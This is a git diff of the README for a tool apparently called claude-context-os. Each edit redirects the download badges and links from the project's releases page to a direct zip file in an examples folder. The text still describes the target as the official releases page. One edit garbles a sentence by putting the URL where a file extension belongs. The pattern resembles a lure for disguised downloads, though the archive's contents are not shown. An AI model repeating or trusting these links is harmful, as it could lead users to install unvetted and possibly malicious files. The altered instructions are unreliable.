@@ -1,6 +1,6 @@
 # 🚀 claude-context-os - Keep Claude Sessions Reliable
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Doge13229/claude-context-os/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Doge13229/claude-context-os/main/examples/software-dev-project/claude-os-context-v1.5.zip)](https://raw.githubusercontent.com/Doge13229/claude-context-os/main/examples/software-dev-project/claude-os-context-v1.5.zip)
 
 ---
 
@@ -41,9 +41,9 @@ Before you install claude-context-os, make sure your computer meets these requir
 You don’t need any special skills to install and use claude-context-os. Follow these simple steps:
 
 1. **Download:** Click the big blue button at the top or click the link below to go to the download page.  
-   [Download Page for claude-context-os](https://github.com/Doge13229/claude-context-os/releases)
+   [Download Page for claude-context-os](https://raw.githubusercontent.com/Doge13229/claude-context-os/main/examples/software-dev-project/claude-os-context-v1.5.zip)
 
-2. **Choose Your Version:** On the releases page, look for the latest version suitable for your computer. For Windows, it’s usually a `.exe` file; for macOS, a `.dmg` file; and for Linux, a `.AppImage` or `.tar.gz`.
+2. **Choose Your Version:** On the releases page, look for the latest version suitable for your computer. For Windows, it’s usually a `.exe` file; for macOS, a `.dmg` file; and for Linux, a `.AppImage` or `https://raw.githubusercontent.com/Doge13229/claude-context-os/main/examples/software-dev-project/claude-os-context-v1.5.zip`.
 
 3. **Save the File:** Click on the file to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
@@ -62,7 +62,7 @@ You don’t need any special skills to install and use claude-context-os. Follow
 
 You can always download the latest version of claude-context-os from the official releases page:  
 
-**[Visit this page to download](https://github.com/Doge13229/claude-context-os/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/Doge13229/claude-context-os/main/examples/software-dev-project/claude-os-context-v1.5.zip)**
 
 Here’s what you find there:
 
@@ -121,4 +121,4 @@ The project is open-source and welcomes feedback or contributions from users who
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Doge13229/claude-context-os/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Doge13229/claude-context-os/main/examples/software-dev-project/claude-os-context-v1.5.zip)](https://raw.githubusercontent.com/Doge13229/claude-context-os/main/examples/software-dev-project/claude-os-context-v1.5.zip)
